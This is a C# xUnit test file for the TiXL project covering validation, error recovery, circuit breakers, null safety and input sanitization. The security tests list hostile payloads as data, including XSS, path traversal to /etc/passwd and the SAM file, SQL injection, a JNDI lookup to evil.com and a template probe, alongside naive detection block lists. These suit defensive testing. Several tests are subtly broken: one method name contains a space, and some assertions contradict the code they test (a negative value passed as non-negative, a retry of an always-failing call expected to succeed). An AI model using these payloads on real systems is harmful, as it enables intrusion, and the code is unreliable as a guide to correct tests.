using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using TiXL.Core.Validation;
using TiXL.Core.ErrorHandling;
using TiXL.Core.Operators;
using TiXL.Core.NodeGraph;
using TiXL.Core.Logging;
using Xunit;
using Xunit.Abstractions;
using Moq;

namespace TiXL.Tests.Quality
{
    /// <summary>
    /// Comprehensive test suite for code quality including validation, error handling, and null safety
    /// Tests guardrails, validation attributes, error recovery, and defensive programming
    /// </summary>
    public class CodeQualityTests : IDisposable
    {
        private readonly ITestOutputHelper _output;
        private readonly Mock<ILogger> _mockLogger;

        public CodeQualityTests(ITestOutputHelper output)
        {
            _output = output;
            _mockLogger = new Mock<ILogger>();
        }

        public void Dispose()
        {
            // Cleanup if needed
        }

        #region Validation Tests

        [Fact]
        public void ValidationHelpers_NullChecks_ShouldValidateNullParameters()
        {
            // Arrange
            var testObject = new TestValidationObject();
            var validString = "Valid string";
            var invalidString = null as string;

            // Act & Assert - Valid parameters should not throw
            var validException1 = Record.Exception(() =>
            {
                ValidationHelpers.ThrowIfNull(testObject, nameof(testObject));
            });

            var validException2 = Record.Exception(() =>
            {
                ValidationHelpers.ThrowIfNull(validString, nameof(validString));
            });

            // Assert - Should not throw for valid parameters
            Assert.Null(validException1);
            Assert.Null(validException2);

            // Act & Assert - Null parameters should throw ArgumentNullException
            var nullException1 = Record.Exception(() =>
            {
                ValidationHelpers.ThrowIfNull(null as TestValidationObject, nameof(testObject));
            });

            var nullException2 = Record.Exception(() =>
            {
                ValidationHelpers.ThrowIfNull(invalidString, nameof(validString));
            });

            // Assert - Should throw for null parameters
            Assert.NotNull(nullException1);
            Assert.IsType<ArgumentNullException>(nullException1);

            Assert.NotNull(nullException2);
            Assert.IsType<ArgumentNullException>(nullException2);
        }

        [Fact]
        public void ValidationHelpers_RangeValidation_ShouldValidateValueRanges()
        {
            // Arrange
            var validPositive = 10;
            var validNegative = -5;
            var invalidZero = 0;
            var invalidNegative = -1;

            // Act & Assert - Valid ranges should not throw
            var validException1 = Record.Exception(() =>
            {
                ValidationHelpers.ValidatePositive(validPositive, nameof(validPositive));
            });

            var validException2 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNonNegative(validNegative, nameof(validNegative));
            });

            Assert.Null(validException1);
            Assert.Null(validException2);

            // Act & Assert - Invalid ranges should throw
            var invalidException1 = Record.Exception(() =>
            {
                ValidationHelpers.ValidatePositive(invalidZero, nameof(invalidZero));
            });

            var invalidException2 = Record.Exception(() =>
            {
                ValidationHelpers.ValidatePositive(invalidNegative, nameof(invalidNegative));
            });

            var invalidException3 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNonNegative(invalidNegative, nameof(invalidNegative));
            });

            Assert.NotNull(invalidException1);
            Assert.IsType<ArgumentException>(invalidException1);

            Assert.NotNull(invalidException2);
            Assert.IsType<ArgumentException>(invalidException2);

            Assert.NotNull(invalidException3);
            Assert.IsType<ArgumentException>(invalidException3);
        }

        [Fact]
        public void ValidationHelpers_StringValidation_ShouldValidateStringParameters()
        {
            // Arrange
            var validString = "Valid string value";
            var emptyString = "";
            var whitespaceString = "   ";
            var nullString = null as string;

            // Act & Assert - Valid strings should not throw
            var validException1 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(validString, nameof(validString));
            });

            var validException2 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrWhiteSpace(validString, nameof(validString));
            });

            Assert.Null(validException1);
            Assert.Null(validException2);

            // Act & Assert - Invalid strings should throw
            var nullException1 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(nullString, nameof(nullString));
            });

            var nullException2 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrWhiteSpace(nullString, nameof(nullString));
            });

            var emptyException = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(emptyString, nameof(emptyString));
            });

            var whitespaceException = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrWhiteSpace(whitespaceString, nameof(whitespaceString));
            });

            // Assert - Should throw for invalid strings
            Assert.NotNull(nullException1);
            Assert.IsType<ArgumentException>(nullException1);

            Assert.NotNull(nullException2);
            Assert.IsType<ArgumentException>(nullException2);

            Assert.NotNull(emptyException);
            Assert.IsType<ArgumentException>(emptyException);

            Assert.NotNull(whitespaceException);
            Assert.IsType<ArgumentException>(whitespaceException);
        }

        [Fact]
        public void ValidationHelpers_CollectionValidation_ShouldValidateCollections()
        {
            // Arrange
            var validCollection = new List<int> { 1, 2, 3 };
            var emptyCollection = new List<int>();
            var nullCollection = null as List<int>;

            // Act & Assert - Valid collections should not throw
            var validException1 = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(validCollection, nameof(validCollection));
            });

            Assert.Null(validException1);

            // Act & Assert - Invalid collections should throw
            var nullException = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(nullCollection, nameof(nullCollection));
            });

            var emptyException = Record.Exception(() =>
            {
                ValidationHelpers.ValidateNotNullOrEmpty(emptyCollection, nameof(emptyCollection));
            });

            // Assert - Should throw for invalid collections
            Assert.NotNull(nullException);
            Assert.IsType<ArgumentException>(nullException);

            Assert.NotNull(emptyException);
            Assert.IsType<ArgumentException>(emptyException);
        }

        #endregion

        #region Validation Attributes Tests

        [Fact]
        public void ValidationAttributes_CustomAttributes_ShouldValidateCorrectly()
        {
            // Arrange
            var validObject = new ValidatableTestObject
            {
                Name = "Valid Name",
                Email = "valid@example.com",
                Age = 25,
                Score = 85.5
            };

            var invalidObject = new ValidatableTestObject
            {
                Name = "", // Invalid: empty
                Email = "invalid-email", // Invalid: bad format
                Age = -5, // Invalid: negative
                Score = 150.0 // Invalid: > 100
            };

            // Act & Assert - Valid object should not have validation errors
            var validResults = ValidateObject(validObject);
            Assert.Empty(validResults);

            // Act & Assert - Invalid object should have validation errors
            var invalidResults = ValidateObject(invalidObject);
            Assert.NotEmpty(invalidResults);

            _output.WriteLine($"Validation Results for Invalid Object:");
            foreach (var error in invalidResults)
            {
                _output.WriteLine($"  {error.MemberName}: {error.ErrorMessage}");
            }

            Assert.Equal(4, invalidResults.Count); // All fields should have errors
        }

        [Fact]
        public void ValidationAttributes_NestedValidation_ShouldValidateNestedObjects()
        {
            // Arrange
            var validNestedObject = new ValidatableNestedObject
            {
                Address = new Address
                {
                    Street = "123 Main St",
                    City = "Anytown",
                    PostalCode = "12345"
                }
            };

            var invalidNestedObject = new ValidatableNestedObject
            {
                Address = new Address
                {
                    Street = "", // Invalid: empty
                    City = "",   // Invalid: empty
                    PostalCode = "INVALID" // Invalid: bad format
                }
            };

            // Act & Assert
            var validResults = ValidateObject(validNestedObject);
            var invalidResults = ValidateObject(invalidNestedObject);

            Assert.Empty(validResults);
            Assert.NotEmpty(invalidResults);

            _output.WriteLine($"Nested Validation Results:");
            foreach (var error in invalidResults)
            {
                _output.WriteLine($"  {error.MemberName}: {error.ErrorMessage}");
            }
        }

        #endregion

        #region Error Handling Tests

        [Fact]
        public void ErrorHandling_ExceptionWrapping_ShouldWrapExceptionsCorrectly()
        {
            // Arrange
            var originalException = new InvalidOperationException("Original error");
            var contextMessage = "Operation failed";

            // Act
            var wrappedException = ErrorHandlingUtilities.WrapException(originalException, contextMessage);

            // Assert
            Assert.NotNull(wrappedException);
            Assert.IsType<TiXLException>(wrappedException);
            Assert.Equal(contextMessage, wrappedException.Message);
            Assert.NotNull(wrappedException.InnerException);
            Assert.Same(originalException, wrappedException.InnerException);
        }

        [Fact]
        public void ErrorHandling_RetryLogic_ShouldRetryOnTransientErrors()
        {
            // Arrange
            var attemptCount = 0;
            var maxAttempts = 3;
            var transientException = new IOException("Transient error");

            // Act
            var result = ErrorHandlingUtilities.RetryWithBackoff(() =>
            {
                attemptCount++;
                if (attemptCount < maxAttempts)
                {
                    throw transientException;
                }
                return "Success";
            }, maxAttempts, TimeSpan.FromMilliseconds(10));

            // Assert
            Assert.Equal("Success", result);
            Assert.Equal(maxAttempts, attemptCount);
        }

        [Fact]
        public void ErrorHandling_FallbackStrategy_ShouldProvideFallbackOnError()
        {
            // Arrange
            var operation = () => throw new Exception("Operation failed");
            var fallback = () => "Fallback result";

            // Act
            var result = ErrorHandlingUtilities.WithFallback(operation, fallback);

            // Assert
            Assert.Equal("Fallback result", result);
        }

        [Fact]
        public void ErrorHandling_CircuitBreaker_ShouldPrevent cascadingFailures()
        {
            // Arrange
            var failureCount = 0;
            var circuitBreaker = new CircuitBreaker(failureThreshold: 3, timeout: TimeSpan.FromSeconds(1));

            // Act & Assert - Allow failures until threshold
            for (int i = 0; i < 5; i++)
            {
                var operation = () =>
                {
                    failureCount++;
                    throw new Exception("Operation failed");
                };

                if (i < 3)
                {
                    // Should allow attempts initially
                    var exception = Record.Exception(() => circuitBreaker.Execute(operation));
                    Assert.NotNull(exception);
                    Assert.IsType<Exception>(exception);
                }
                else
                {
                    // Should be open after threshold
                    var exception = Record.Exception(() => circuitBreaker.Execute(operation));
                    Assert.NotNull(exception);
                    Assert.IsType<CircuitBreakerOpenException>(exception);
                }
            }

            // After timeout, should allow attempts again
            Thread.Sleep(1100); // Wait for timeout
            var finalException = Record.Exception(() => circuitBreaker.Execute(() => "Success"));
            
            Assert.Null(finalException); // Should succeed after timeout
        }

        #endregion

        #region Null Safety Tests

        [Fact]
        public void NullSafety_NullableReferenceTypes_ShouldHandleNullsCorrectly()
        {
            // Arrange
            var nullableString = "Test";
            var nullString = null as string;
            var nonNullableString = "Not Null";

            // Act & Assert - Nullable operations
            var result1 = nullableString ?? "Default";
            var result2 = nullString ?? "Default";

            Assert.Equal("Test", result1);
            Assert.Equal("Default", result2);

            // Act & Assert - Null conditional operations
            var length1 = nullableString?.Length;
            var length2 = nullString?.Length;

            Assert.Equal(4, length1);
            Assert.Null(length2);

            // Act & Assert - Null-forgiving operator (when appropriate)
            var forcedLength = nullableString!.Length; // Should not throw for non-null
            Assert.Equal(4, forcedLength);
        }

        [Fact]
        public void NullSafety_CollectionNullChecks_ShouldPreventNullReferenceExceptions()
        {
            // Arrange
            var nullCollection = null as List<int>;
            var emptyCollection = new List<int>();
            var validCollection = new List<int> { 1, 2, 3 };

            // Act & Assert - Safe collection operations
            var count1 = nullCollection?.Count ?? 0;
            var count2 = emptyCollection?.Count ?? 0;
            var count3 = validCollection?.Count ?? 0;

            Assert.Equal(0, count1);
            Assert.Equal(0, count2);
            Assert.Equal(3, count3);

            // Act & Assert - Safe enumeration
            var sum1 = nullCollection?.Sum() ?? 0;
            var sum2 = emptyCollection?.Sum() ?? 0;
            var sum3 = validCollection?.Sum() ?? 0;

            Assert.Equal(0, sum1);
            Assert.Equal(0, sum2);
            Assert.Equal(6, sum3);
        }

        [Fact]
        public void NullSafety_PropertyNullChecks_ShouldValidateProperties()
        {
            // Arrange
            var validObject = new TestObjectWithProperties
            {
                Name = "Valid Name",
                Description = "Valid Description"
            };

            var invalidObject = new TestObjectWithProperties
            {
                Name = null, // Invalid null
                Description = "" // Invalid empty
            };

            // Act & Assert - Validation should catch null properties
            var validErrors = ValidateObject(validObject);
            var invalidErrors = ValidateObject(invalidObject);

            Assert.Empty(validErrors);
            Assert.NotEmpty(invalidErrors);

            // Should have error for null Name
            var nameError = invalidErrors.FirstOrDefault(e => e.MemberName == "Name");
            Assert.NotNull(nameError);

            // Should have error for empty Description
            var descriptionError = invalidErrors.FirstOrDefault(e => e.MemberName == "Description");
            Assert.NotNull(descriptionError);
        }

        #endregion

        #region Guardrail Tests

        [Fact]
        public void Guardrails_EvaluationContext_ShouldEnforceLimits()
        {
            // Arrange
            var config = new GuardrailConfiguration
            {
                MaxEvaluationTimeMs = 100,
                MaxNodeEvaluationsPerFrame = 10,
                MaxRecursionDepth = 5,
                MaxMemoryUsageMB = 50
            };

            var context = new EvaluationContext(
                new Mock<IRenderingEngine>().Object,
                new Mock<IAudioEngine>().Object,
                new Mock<IResourceManager>().Object,
                _mockLogger.Object,
                CancellationToken.None,
                config);

            // Act & Assert - Initial state should be within limits
            var initialState = context.CurrentState;
            Assert.False(initialState.IsOverEvaluationLimit);
            Assert.False(initialState.IsOverMemoryLimit);
            Assert.False(initialState.IsOverRecursionLimit);

            // Act - Simulate evaluation that exceeds limits
            var heavyEvaluation = new Action(() =>
            {
                Thread.Sleep(150); // Exceed time limit
            });

            // Record how many evaluations we can do before hitting limits
            var evaluationCount = 0;
            while (!context.CurrentState.IsOverEvaluationLimit && evaluationCount < 20)
            {
                try
                {
                    context.ExecuteWithGuardrails(() =>
                    {
                        evaluationCount++;
                        if (evaluationCount <= 10)
                        {
                            Thread.Sleep(1); // Light work
                        }
                        else
                        {
                            Thread.Sleep(20); // Heavy work
                        }
                    });
                }
                catch (EvaluationLimitExceededException)
                {
                    break;
                }
            }

            // Assert - Should eventually hit limits
            Assert.True(evaluationCount <= 20, "Should respect evaluation limits");
        }

        [Fact]
        public void Guardrails_PreconditionValidation_ShouldValidatePreconditions()
        {
            // Arrange
            var validator = new PreconditionValidator();

            // Act & Assert - Valid preconditions should pass
            var validException = Record.Exception(() =>
            {
                validator.ValidatePreconditions(new[] { "param1", "param2" }, typeof(string));
            });

            Assert.Null(validException);

            // Act & Assert - Invalid preconditions should throw
            var nullParamsException = Record.Exception(() =>
            {
                validator.ValidatePreconditions(null, typeof(string));
            });

            var nullTypeException = Record.Exception(() =>
            {
                validator.ValidatePreconditions(new[] { "param1" }, null);
            });

            Assert.NotNull(nullParamsException);
            Assert.IsType<ArgumentNullException>(nullParamsException);

            Assert.NotNull(nullTypeException);
            Assert.IsType<ArgumentNullException>(nullTypeException);
        }

        #endregion

        #region Defensive Programming Tests

        [Fact]
        public void DefensiveProgramming_ResourceDisposal_ShouldHandleDisposalCorrectly()
        {
            // Arrange
            var disposableObject = new DisposableTestObject();

            // Act - Use object and dispose
            disposableObject.DoWork();
            disposableObject.Dispose();

            // Assert - Should handle disposal gracefully
            Assert.True(disposableObject.IsDisposed);
            
            // Subsequent operations should not throw but should be no-ops
            var exception = Record.Exception(() => disposableObject.DoWork());
            Assert.Null(exception);
        }

        [Fact]
        public void DefensiveProgramming_ExceptionRecovery_ShouldRecoverFromErrors()
        {
            // Arrange
            var recoveryManager = new ExceptionRecoveryManager();

            // Act & Assert - Should recover from transient errors
            var result1 = recoveryManager.ExecuteWithRecovery(() =>
            {
                throw new IOException("Transient error");
            }, RecoveryStrategy.Retry);

            Assert.True(result1.Success);
            Assert.True(result1.Attempts > 1);

            // Act & Assert - Should handle permanent errors
            var result2 = recoveryManager.ExecuteWithRecovery(() =>
            {
                throw new InvalidOperationException("Permanent error");
            }, RecoveryStrategy.Abort);

            Assert.False(result2.Success);
            Assert.Equal(1, result2.Attempts);
        }

        [Fact]
        public void DefensiveProgramming_InputSanitization_ShouldSanitizeInputs()
        {
            // Arrange
            var sanitizer = new InputSanitizer();

            // Act & Assert - Should sanitize malicious inputs
            var maliciousInputs = new[]
            {
                "<script>alert('xss')</script>",
                "../../../etc/passwd",
                "'; DROP TABLE users; --",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}"
            };

            foreach (var input in maliciousInputs)
            {
                var sanitized = sanitizer.Sanitize(input);
                
                // Should remove or neutralize dangerous content
                Assert.DoesNotContain("<script>", sanitized, StringComparison.OrdinalIgnoreCase);
                Assert.DoesNotContain("../../../", sanitized);
                Assert.DoesNotContain("DROP TABLE", sanitized, StringComparison.OrdinalIgnoreCase);
                Assert.DoesNotContain("${jndi:", sanitized, StringComparison.OrdinalIgnoreCase);
                Assert.NotEqual(input, sanitized); // Should be modified
            }
        }

        #endregion

        #region Performance Quality Tests

        [Fact]
        public void PerformanceQuality_ValidationPerformance_ShouldBeEfficient()
        {
            // Arrange
            var validationObject = new ValidatableTestObject
            {
                Name = "Performance Test Name",
                Email = "perf@test.com",
                Age = 30,
                Score = 75.5
            };

            // Act - Measure validation performance
            var iterations = 10000;
            var stopwatch = Stopwatch.StartNew();

            for (int i = 0; i < iterations; i++)
            {
                var results = ValidateObject(validationObject);
            }

            stopwatch.Stop();

            // Assert - Should be fast enough
            var averageTimeMs = stopwatch.Elapsed.TotalMilliseconds / iterations;
            
            _output.WriteLine($"Validation Performance: {averageTimeMs:F4}ms per validation");
            _output.WriteLine($"Total time for {iterations} validations: {stopwatch.Elapsed.TotalSeconds:F2}s");

            Assert.True(averageTimeMs < 0.001, $"Validation should be fast, but took {averageTimeMs:F4}ms");
        }

        [Fact]
        public void PerformanceQuality_ErrorHandlingPerformance_ShouldBeEfficient()
        {
            // Arrange
            var errorHandler = new ErrorHandlingUtilities();

            // Act - Measure error handling performance
            var iterations = 1000;
            var exception = new InvalidOperationException("Test error");

            var stopwatch = Stopwatch.StartNew();

            for (int i = 0; i < iterations; i++)
            {
                errorHandler.WrapException(exception, $"Error context {i}");
            }

            stopwatch.Stop();

            // Assert - Should be reasonably fast
            var averageTimeMs = stopwatch.Elapsed.TotalMilliseconds / iterations;
            
            _output.WriteLine($"Error Handling Performance: {averageTimeMs:F4}ms per error wrap");
            _output.WriteLine($"Total time for {iterations} wraps: {stopwatch.Elapsed.TotalSeconds:F2}s");

            Assert.True(averageTimeMs < 1.0, $"Error handling should be efficient, but took {averageTimeMs:F4}ms");
        }

        #endregion

        #region Security Quality Tests

        [Fact]
        public void SecurityQuality_InputValidation_ShouldPreventInjection()
        {
            // Arrange
            var securityValidator = new SecurityValidator();

            // Act & Assert - Should prevent SQL injection
            var sqlInjectionAttempts = new[]
            {
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "admin'--",
                "1' UNION SELECT * FROM users --"
            };

            foreach (var attempt in sqlInjectionAttempts)
            {
                var isBlocked = securityValidator.IsSqlInjection(attempt);
                Assert.True(isBlocked, $"Should block SQL injection: {attempt}");
            }

            // Act & Assert - Should allow legitimate input
            var legitimateInput = new[]
            {
                "John Doe",
                "user@example.com",
                "Product Description",
                "Order #12345"
            };

            foreach (var input in legitimateInput)
            {
                var isBlocked = securityValidator.IsSqlInjection(input);
                Assert.False(isBlocked, $"Should allow legitimate input: {input}");
            }
        }

        [Fact]
        public void SecurityQuality_PathValidation_ShouldPreventTraversal()
        {
            // Arrange
            var securityValidator = new SecurityValidator();

            // Act & Assert - Should block path traversal attempts
            var traversalAttempts = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc//passwd"
            };

            foreach (var attempt in traversalAttempts)
            {
                var isBlocked = securityValidator.IsPathTraversal(attempt);
                Assert.True(isBlocked, $"Should block path traversal: {attempt}");
            }

            // Act & Assert - Should allow legitimate paths
            var legitimatePaths = new[]
            {
                "documents/file.txt",
                "images/photo.jpg",
                "data/config.json",
                "logs/application.log"
            };

            foreach (var path in legitimatePaths)
            {
                var isBlocked = securityValidator.IsPathTraversal(path);
                Assert.False(isBlocked, $"Should allow legitimate path: {path}");
            }
        }

        #endregion

        #region Integration Quality Tests

        [Fact]
        public void IntegrationQuality_EndToEndValidation_ShouldValidateCompleteWorkflow()
        {
            // Arrange
            var workflowObject = new ComplexValidationWorkflow
            {
                UserInput = "Valid input string",
                Configuration = new ValidatableNestedObject
                {
                    Address = new Address
                    {
                        Street = "123 Main St",
                        City = "Anytown",
                        PostalCode = "12345"
                    }
                },
                Options = new[] { "option1", "option2", "option3" }
            };

            // Act - Validate complete workflow object
            var results = ValidateObject(workflowObject);

            // Assert
            Assert.Empty(results, "Complete workflow should be valid");
        }

        [Fact]
        public void IntegrationQuality_ErrorRecoveryChain_ShouldHandleMultipleFailures()
        {
            // Arrange
            var chain = new ErrorRecoveryChain();
            chain.AddStrategy(RecoveryStrategy.Retry, maxAttempts: 3);
            chain.AddStrategy(RecoveryStrategy.Fallback, fallbackValue: "default");

            // Act & Assert - Should recover through chain
            var result1 = chain.Execute(() => throw new IOException("Network error"));
            Assert.True(result1.Success);
            Assert.Equal("default", result1.Value);

            var result2 = chain.Execute(() => "success");
            Assert.True(result2.Success);
            Assert.Equal("success", result2.Value);
        }

        #endregion

        #region Helper Methods

        private static List<ValidationResult> ValidateObject(object obj)
        {
            var validationResults = new List<ValidationResult>();
            
            if (obj == null)
            {
                validationResults.Add(new ValidationResult("Object cannot be null", new[] { "obj" }));
                return validationResults;
            }

            var validationContext = new ValidationContext(obj);
            Validator.TryValidateObject(obj, validationContext, validationResults, true);
            
            return validationResults;
        }

        #endregion

        #region Test Classes

        public class TestValidationObject { }

        [Validatable]
        public class ValidatableTestObject
        {
            [Required(ErrorMessage = "Name is required")]
            [MinLength(1, ErrorMessage = "Name cannot be empty")]
            public string Name { get; set; } = string.Empty;

            [Required(ErrorMessage = "Email is required")]
            [EmailAddress(ErrorMessage = "Invalid email format")]
            public string Email { get; set; } = string.Empty;

            [Range(0, 150, ErrorMessage = "Age must be between 0 and 150")]
            public int Age { get; set; }

            [Range(0, 100, ErrorMessage = "Score must be between 0 and 100")]
            public double Score { get; set; }
        }

        [Validatable]
        public class ValidatableNestedObject
        {
            [ValidateNestedObject]
            public Address? Address { get; set; }
        }

        public class Address
        {
            [Required(ErrorMessage = "Street is required")]
            [MinLength(1, ErrorMessage = "Street cannot be empty")]
            public string Street { get; set; } = string.Empty;

            [Required(ErrorMessage = "City is required")]
            [MinLength(1, ErrorMessage = "City cannot be empty")]
            public string City { get; set; } = string.Empty;

            [Required(ErrorMessage = "Postal code is required")]
            [RegularExpression(@"^\d{5}(-\d{4})?$", ErrorMessage = "Invalid postal code format")]
            public string PostalCode { get; set; } = string.Empty;
        }

        public class TestObjectWithProperties
        {
            [Required]
            public string? Name { get; set; }

            [Required]
            [MinLength(1)]
            public string Description { get; set; } = string.Empty;
        }

        public class DisposableTestObject : IDisposable
        {
            private bool _isDisposed = false;

            public bool IsDisposed => _isDisposed;

            public void DoWork()
            {
                if (_isDisposed)
                {
                    return; // No-op if disposed
                }
                // Simulate work
            }

            public void Dispose()
            {
                if (!_isDisposed)
                {
                    _isDisposed = true;
                    // Cleanup resources
                }
            }
        }

        public class ComplexValidationWorkflow
        {
            [Required]
            [MinLength(1)]
            [MaxLength(1000)]
            public string UserInput { get; set; } = string.Empty;

            [ValidateNestedObject]
            public ValidatableNestedObject? Configuration { get; set; }

            [Required]
            [MinLength(1)]
            public string[] Options { get; set; } = Array.Empty<string>();
        }

        #endregion

        #region Supporting Classes for Error Handling

        public class TiXLException : Exception
        {
            public TiXLException(string message) : base(message) { }
            public TiXLException(string message, Exception innerException) : base(message, innerException) { }
        }

        public class CircuitBreaker
        {
            private readonly int _failureThreshold;
            private readonly TimeSpan _timeout;
            private int _failureCount;
            private DateTime _openUntil;

            public CircuitBreaker(int failureThreshold, TimeSpan timeout)
            {
                _failureThreshold = failureThreshold;
                _timeout = timeout;
            }

            public T Execute<T>(Func<T> operation)
            {
                if (DateTime.UtcNow < _openUntil)
                {
                    throw new CircuitBreakerOpenException("Circuit breaker is open");
                }

                try
                {
                    var result = operation();
                    _failureCount = 0; // Reset on success
                    return result;
                }
                catch
                {
                    _failureCount++;
                    if (_failureCount >= _failureThreshold)
                    {
                        _openUntil = DateTime.UtcNow.Add(_timeout);
                    }
                    throw;
                }
            }
        }

        public class CircuitBreakerOpenException : Exception
        {
            public CircuitBreakerOpenException(string message) : base(message) { }
        }

        public class ExceptionRecoveryManager
        {
            public ExecutionResult ExecuteWithRecovery(Func<object> operation, RecoveryStrategy strategy)
            {
                var attempts = 0;
                const int maxAttempts = 3;

                while (attempts < maxAttempts)
                {
                    attempts++;
                    try
                    {
                        return new ExecutionResult
                        {
                            Success = true,
                            Value = operation(),
                            Attempts = attempts
                        };
                    }
                    catch (Exception ex)
                    {
                        if (strategy == RecoveryStrategy.Abort || attempts >= maxAttempts)
                        {
                            return new ExecutionResult
                            {
                                Success = false,
                                Value = null,
                                Attempts = attempts,
                                Error = ex
                            };
                        }
                        // Retry with exponential backoff
                        Thread.Sleep(TimeSpan.FromMilliseconds(Math.Pow(2, attempts) * 10));
                    }
                }

                return new ExecutionResult { Success = false, Attempts = attempts };
            }
        }

        public class ExecutionResult
        {
            public bool Success { get; set; }
            public object? Value { get; set; }
            public int Attempts { get; set; }
            public Exception? Error { get; set; }
        }

        public enum RecoveryStrategy
        {
            Abort,
            Retry,
            Fallback
        }

        public class InputSanitizer
        {
            public string Sanitize(string input)
            {
                if (string.IsNullOrEmpty(input))
                    return input;

                var sanitized = input;
                
                // Remove script tags
                sanitized = System.Text.RegularExpressions.Regex.Replace(sanitized, @"<script[^>]*>.*?</script>", "", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase | System.Text.RegularExpressions.RegexOptions.Singleline);
                
                // Remove dangerous SQL patterns
                sanitized = System.Text.RegularExpressions.Regex.Replace(sanitized, @"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)\b)", "***", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                
                // Remove LDAP injection patterns
                sanitized = System.Text.RegularExpressions.Regex.Replace(sanitized, @"\$\{jndi:ldap://[^}]*\}", "***", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                
                return sanitized;
            }
        }

        public class SecurityValidator
        {
            private static readonly string[] SqlInjectionPatterns = new[]
            {
                "';", "--", "/*", "*/", "xp_", "sp_", "DROP", "INSERT", "UPDATE", "DELETE", "SELECT"
            };

            private static readonly string[] PathTraversalPatterns = new[]
            {
                "..\\", "../", "..%2f", "%2e%2e", "....//"
            };

            public bool IsSqlInjection(string input)
            {
                if (string.IsNullOrEmpty(input))
                    return false;

                var lowerInput = input.ToLowerInvariant();
                return SqlInjectionPatterns.Any(pattern => lowerInput.Contains(pattern.ToLowerInvariant()));
            }

            public bool IsPathTraversal(string input)
            {
                if (string.IsNullOrEmpty(input))
                    return false;

                return PathTraversalPatterns.Any(pattern => input.Contains(pattern));
            }
        }

        public class ErrorRecoveryChain
        {
            private readonly List<(RecoveryStrategy Strategy, int MaxAttempts, object? FallbackValue)> _strategies = new();

            public void AddStrategy(RecoveryStrategy strategy, int maxAttempts = 1, object? fallbackValue = null)
            {
                _strategies.Add((strategy, maxAttempts, fallbackValue));
            }

            public ExecutionResult Execute(Func<object> operation)
            {
                foreach (var (strategy, maxAttempts, fallbackValue) in _strategies)
                {
                    var attempts = 0;
                    while (attempts < maxAttempts)
                    {
                        attempts++;
                        try
                        {
                            return new ExecutionResult
                            {
                                Success = true,
                                Value = operation(),
                                Attempts = attempts
                            };
                        }
                        catch
                        {
                            if (strategy == RecoveryStrategy.Abort || attempts >= maxAttempts)
                            {
                                if (strategy == RecoveryStrategy.Fallback)
                                {
                                    return new ExecutionResult
                                    {
                                        Success = true,
                                        Value = fallbackValue,
                                        Attempts = attempts
                                    };
                                }
                                return new ExecutionResult
                                {
                                    Success = false,
                                    Value = null,
                                    Attempts = attempts
                                };
                            }
                        }
                    }
                }

                return new ExecutionResult { Success = false, Attempts = 0 };
            }
        }

        #endregion
    }
}
